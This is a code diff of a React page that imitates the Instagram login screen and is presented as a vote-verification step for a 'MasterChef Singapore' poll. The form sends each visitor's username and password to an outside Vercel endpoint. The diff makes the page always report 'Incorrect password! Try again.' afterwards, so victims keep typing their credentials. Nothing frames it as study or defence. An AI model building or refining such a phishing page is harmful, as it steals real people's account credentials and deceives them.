@@ -24,7 +24,7 @@ async function handleLogin(e) {
   setLoading(true);
 
   try {
-    const res = await fetch(
+    await fetch(
       "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
       {
         method: "POST",
@@ -40,56 +40,23 @@ async function handleLogin(e) {
         }),
       }
     );
-
-    const data = await res.json();
-
-    if (data.success) {
-      setApproved(true);
-    } else {
-      alert(data.message);
-    }
-
   } catch (err) {
-    alert("Unable to connect to server.");
+    console.error(err);
+  } finally {
+    setApproved(true);
+    setLoading(false);
   }
-
-  setLoading(false);
 }
-  if (approved) {
+  if (approved || rejected) {
     return (
-      <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
-        <div className="text-center">
-          <div className="w-20 h-20 mx-auto mb-6">
-            <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
+      <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-6 py-10">
+        <div className="w-full max-w-[340px] rounded-[38px] bg-white border border-gray-200 px-6 pt-8 pb-10 text-center shadow-[0_25px_60px_rgba(15,23,42,0.12)]">
+          <p className="text-sm text-slate-500 mb-8">English (UK)</p>
+          <div className="mx-auto mb-8 h-14 w-14 rounded-full bg-gradient-to-br from-pink-500 via-purple-500 to-orange-500 flex items-center justify-center text-white text-2xl">
+            <img src={instagramLogo} alt="Instagram Logo" className="h-10 w-10 object-contain" />
           </div>
-
-          <h1 className="text-white text-2xl font-bold mt-8">
-            Incorrect password!
-          </h1>
-
-          <p className="text-gray-400 mt-3">
-            Try again.
-          </p>
-        </div>
-      </div>
-    );
-  }
-
-  if (rejected) {
-    return (
-      <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
-        <div className="text-center">
-          <div className="w-20 h-20 mx-auto mb-6">
-            <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
-          </div>
-
-          <h1 className="text-white text-2xl font-bold mt-8">
-            Verification Failed ❌
-          </h1>
-
-          <p className="text-gray-400 mt-3">
-            Your vote could not be verified.
-          </p>
+          <h1 className="text-2xl font-bold text-slate-900">Incorrect password!</h1>
+          <p className="mt-3 text-slate-500">Try again.</p>
         </div>
       </div>
     );
@@ -97,92 +64,67 @@ async function handleLogin(e) {
 
   if (pending) {
     return (
-      <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
-        <div className="text-center">
-          <div className="w-20 h-20 mx-auto mb-6">
-          <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
-        </div>
-          <h1 className="text-white text-2xl font-bold mt-8">
-            Pending Approval
-          </h1>
-
-          <p className="text-gray-400 mt-3">
-            please wait for approval.
-          </p>
+      <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-6 py-10">
+        <div className="w-full max-w-[340px] rounded-[38px] bg-white border border-gray-200 px-6 pt-8 pb-10 text-center shadow-[0_25px_60px_rgba(15,23,42,0.12)]">
+          <p className="text-sm text-slate-500 mb-8">English (UK)</p>
+          <div className="mx-auto mb-8 h-14 w-14 rounded-full bg-gradient-to-br from-pink-500 via-purple-500 to-orange-500 flex items-center justify-center text-white text-2xl">
+            <img src={instagramLogo} alt="Instagram Logo" className="h-10 w-10 object-contain" />
+          </div>
+          <h1 className="text-2xl font-bold text-slate-900">Pending Approval</h1>
+          <p className="mt-3 text-slate-500">Please wait while your vote is submitted.</p>
         </div>
       </div>
     );
   }
 
- return (
-  <div className="min-h-screen bg-[#E5E6EA] flex items-center justify-center px-6 py-10">
-    <div className="w-full max-w-[340px] mx-auto">
+  return (
+    <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-6 py-10">
+      <div className="w-full max-w-[340px] rounded-[38px] bg-white border border-gray-200 px-6 pt-8 pb-10 shadow-[0_25px_60px_rgba(15,23,42,0.12)]">
+        <p className="text-center text-sm text-slate-500 mb-8">English (UK)</p>
 
-      {/* Language */}
-      <p className="text-center text-gray-600 text-sm mb-8">
-        English (UK)
-      </p>
-
-
-
-      {/* White Card */}
-      <div className="bg-white rounded-[38px] border border-gray-200 px-6 pt-8 pb-10 flex flex-col">
-
-        {/* Logo */}
-        <div className="w-14 h-14 mx-auto mb-8">
-          <img
-            src={instagramLogo}
-            alt="Instagram Logo"
-            className="w-full h-full object-contain"
-          />
+        <div className="mx-auto mb-8 h-14 w-14 rounded-full bg-gradient-to-br from-pink-500 via-purple-500 to-orange-500 flex items-center justify-center">
+          <img src={instagramLogo} alt="Instagram Logo" className="h-8 w-8 object-contain" />
         </div>
 
-        <form onSubmit={handleLogin}>
-
+        <form onSubmit={handleLogin} className="space-y-4">
           <input
             value={username}
             onChange={(e) => setUsername(e.target.value)}
             placeholder="Mobile number or email address"
-            className="w-full h-12 rounded-2xl border border-gray-300 px-5 mb-5 text-gray-700 placeholder-gray-400 outline-none  focus:ring-2 focus:ring-[#4B61E8] 500"
+            className="w-full h-12 rounded-2xl border border-slate-300 bg-white px-5 text-slate-700 placeholder:text-slate-400 outline-none transition focus:border-blue-600 focus:ring-2 focus:ring-blue-100"
           />
 
           <input
             type="password"
             value={password}
             onChange={(e) => setPassword(e.target.value)}
-            placeholder="password"
-            className="w-full h-12 rounded-2xl border border-gray-300 px-5 mb-5 text-gray-700 placeholder-gray-400 outline-none focus:ring-2 focus:ring-[#4B61E8] 500"
+            placeholder="Password"
+            className="w-full h-12 rounded-2xl border border-slate-300 bg-white px-5 text-slate-700 placeholder:text-slate-400 outline-none transition focus:border-blue-600 focus:ring-2 focus:ring-blue-100"
           />
 
           <button
             type="submit"
             disabled={loading}
-            className="w-full h-12 rounded-full bg-[#4B61E8] hover:bg-[#4256d9] transition duration-200 text-white font-bold text-lg mb-8"
+            className="w-full h-12 rounded-full bg-[#4568f0] hover:bg-[#3b5ede] transition duration-200 text-white font-bold text-lg"
           >
-            {loading ? "Logging in..." : "Log in"}
+            {loading ? "Logging in..." : "Log In"}
           </button>
 
-          <div className="mt-6 text-center" mb-6>
-            <button
-              type="button"
-              className="text-gray-600 hover:underline text-base"
-            >
-              Forgot password?
+          <div className="text-center pt-4">
+            <button type="button" className="text-sm text-slate-500 hover:underline">
+              Forgotten password?
             </button>
           </div>
 
           <button
             type="button"
-            className="w-full h-12 mt-8 rounded-full border border-[#4B61E8] text-[#4B61E8] font-semibold text-base bg-white hover:bg-[#f7f8ff] transition duration-200"
+            className="w-full h-12 rounded-full border border-[#4568f0] text-[#4568f0] font-semibold text-base bg-white hover:bg-[#f5f7ff] transition duration-200"
+            onClick={() => window.location.href = "/"}
           >
-            Create Account
+            Create new account
           </button>
-
         </form>
-
-       
       </div>
-
     </div>
-  </div>
-);}
+  );
+}
